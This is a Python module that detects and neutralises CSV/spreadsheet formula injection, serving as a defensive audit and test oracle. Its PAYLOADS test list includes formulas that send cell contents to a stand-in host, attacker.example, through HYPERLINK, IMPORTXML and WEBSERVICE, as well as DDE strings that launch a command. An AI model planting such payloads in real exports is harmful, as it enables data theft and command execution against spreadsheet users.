"""CSV / spreadsheet formula-injection oracle (threat T-03).

Any lane that exports CSV (application history, job shortlists, experiment
results) must neutralise cells a spreadsheet would evaluate. ``audit_csv`` is
the check lane E runs over every ``*.csv`` artifact a lane produces.
"""

from __future__ import annotations

import csv
import io
import re
import unicodedata
from dataclasses import dataclass

#: Characters that make Excel / LibreOffice / Sheets treat a cell as a formula or DDE call.
TRIGGERS = ("=", "+", "-", "@", "\t", "\r", "\n")
_PLAIN_NUMBER = re.compile(r"^[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?$")

PAYLOADS: tuple[str, ...] = (
    "=1+1",
    '=HYPERLINK("https://attacker.example/?d="&A1,"Open posting")',
    "=cmd|' /C calc'!A0",
    "+SUM(1,1)",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1,1)",
    "\t=1+1",
    "\r=1+1",
    "  =1+1",
    "\uff1d1+1",  # fullwidth '=' normalises to '=' under NFKC
    '=IMPORTXML(CONCAT("https://attacker.example/?",A1),"//a")',
    '=WEBSERVICE("https://attacker.example/"&B2)',
    '"=1+1"',
)
BENIGN: tuple[str, ...] = (
    "", "Forward Deployed Engineer", "-5", "+3.5", "1e-3", "-.5", "C++ / C# engineer", "a=b",
    "5 - 3", "'=already neutralised", "user@fictional.example", "2026-01-05T09:00:00Z",
)  # fmt: skip


@dataclass(frozen=True)
class CsvFinding:
    row: int
    column: int
    value: str

    def __str__(self) -> str:
        return f"row {self.row} col {self.column}: formula-like cell {self.value[:60]!r}"


def is_formula_cell(value: str) -> bool:
    """True when a spreadsheet may evaluate ``value`` as a formula.

    Plain numbers such as ``-5`` are data, not formulas. Leading whitespace,
    wrapping double quotes and Unicode compatibility forms are normalised first
    because spreadsheet importers do the same.
    """
    text = unicodedata.normalize("NFKC", value)
    if text[:1] in ("\t", "\r", "\n"):
        return True
    text = text.lstrip(" \u00a0")
    while len(text) >= 2 and text[0] == '"' and text[-1] == '"':
        text = text[1:-1].lstrip(" \u00a0")
    if not text or text[0] not in TRIGGERS:
        return False
    return _PLAIN_NUMBER.match(text) is None


def neutralize(value: str) -> str:
    """Reference neutralisation (OWASP): prefix a single quote so the cell is text."""
    return "'" + value if is_formula_cell(value) else value


def audit_csv(text: str) -> list[CsvFinding]:
    """Every formula-like cell in a CSV document (row/column are 1-based)."""
    findings: list[CsvFinding] = []
    reader = csv.reader(io.StringIO(text, newline=""))
    for r, row in enumerate(reader, start=1):
        for c, cell in enumerate(row, start=1):
            if is_formula_cell(cell):
                findings.append(CsvFinding(r, c, cell))
    return findings


def to_csv(rows: list[list[str]], *, safe: bool = True) -> str:
    """Reference exporter used in tests; ``safe=False`` shows what the audit catches."""
    buffer = io.StringIO(newline="")
    writer = csv.writer(buffer, lineterminator="\n")
    for row in rows:
        writer.writerow([neutralize(c) if safe else c for c in row])
    return buffer.getvalue()
